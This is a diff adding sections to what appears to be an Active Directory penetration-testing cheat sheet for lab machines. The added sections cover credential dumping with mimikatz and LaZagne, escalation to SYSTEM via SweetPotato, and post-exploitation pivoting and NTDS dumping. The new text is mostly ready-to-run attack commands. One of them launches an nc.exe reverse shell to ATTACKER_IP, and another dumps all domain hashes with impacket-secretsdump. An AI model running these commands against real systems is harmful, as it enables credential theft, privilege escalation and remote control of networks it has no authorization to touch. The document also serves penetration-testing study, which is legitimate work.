@@ -44,6 +44,9 @@
   * <<dpapi,  DPAPI secrets>>
   * <<delegation, SeEnableDelegationPrivilege>>
   * <<cross-session, Cross-Session>>
+  * <<Credential Dumping, Credential Dumping>>
+  * <<ToSystem, ToSystem>>
+- <<post-exploatation, post-exploatation>>
 
 [[overview]]
 == Overview
@@ -564,6 +567,8 @@ This perm is merge between *GetChanges* and *GetChangesAll* , All *secrets* can 
 ```bash
 impacket-secretsdump $domain/'$user':'$pass'@'$domain_ip'
 ```
+
+
 
 [[ForceChangePassword]]
 === ForceChangePassword
@@ -1305,8 +1310,114 @@ Run `RemotePotato0.exe` in target machine
 ./RemotePotato0.exe -m 2 -s 1 -x local_ip
 ```
 
+[[Credential Dumping]]
+== Credential Dumping
+
+For credential dumping from system is used mimikatz or LaZagne.exe, i use mimikatz for dumping machine creds and LaZagne users' 
+
+For successfull dumping creds is higly recommended to run .exe wthis `SYSTEM` privileges also mention recomended to run mimikatz and LaZagne in shell instead of `evil-winrm`
+
+```bash
+.\mimikatz.exe
+```
+
+Dump all creds in system
+
+```bash
+mimikatz # sekurlsa::logonpasswords
+```
+
+Look documentation https://hackviser.com/tactics/tools/mimikatz[here]
+
+Also `LaZagne`
+
+```bash
+.\LaZagne.exe
+```
+
+Dump all creds in system
+
+```bash
+LaZagne.exe all
+```
+
+Documentation https://github.com/AlessandroZ/LaZagne[here]
+
+[[ToSystem]]
+== ToSystem
+
+If we are a Administrator in machine we can elewate privileges to `system` by tool `SweetPotato.exe` this is a technique which contains a multiple privilege escalation vectors such as 
+
+```bash
+RottenPotato
+JuicyPotato
+PrintSpoofer
+EfsPotato / PetitPotam
+```
+
+Start listener
+
+```bash
+rlwrap nc -lvnp  9001
+```
+
+Trigger system
+
+```bash
+.\SweetPotato.exe -e 2 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\$USER\Documents\nc.exe ATTACKER_IP 4444 -e cmd.exe"
+```
+
+[[post-exploatation]]
+== post-exploitation
+
+So in post-exploitation we talk about pivoting,tunneling,domain discovery
+
+Domain discovery by `nmap` and `netexec`
+
+```bash
+nmap -sn 10.10.10.0/24
+```
+
+```bash
+nxc smb/ldap/winrm 10.10.10.0/24
+```
+
+Also can be done with creds
+
+First if we see that our machine has anouther interface in `ifconfig` or `ipconfig` it's 99% a pre-vector to discover a new interface for exp. `192.168.010.0/24` use `ligolo` see more https://github.com/nicocha30/ligolo-ng[here] . Also mention mostly can be used only 80 and 443 ports
+
+In kali machine start ligolo listener
+
+```bash
+sudo ligolo-proxy -selfcert -laddr '10.10.10.00:443'
+```
+
+In target machine
+
+```bash
+./agent -ignore-cert -connect '10.10.10.10:443'
+```
+
+In kali machine
+
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+If in bloodhound you see some relationships between domains in target machine in shell or evil-winrm for exp. we are in domain A and have a `TrustedBy` to domain B so in winrm computer in domain A
+
+```bash
+nltest /dsgetdc:target_domain
+```
+
+This gives a ip and dc.name of target domain
 
 
+If we have only smb share access with admin privileges we can dump `ntds.dit` file which contains an `NTLM` hashes of all users in domain
+
+```bash
+impacket-secretsdump domain.htb/'Administrator'@dc.domain.htb -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -use-vss -k -no-pass
+```
 
 
 
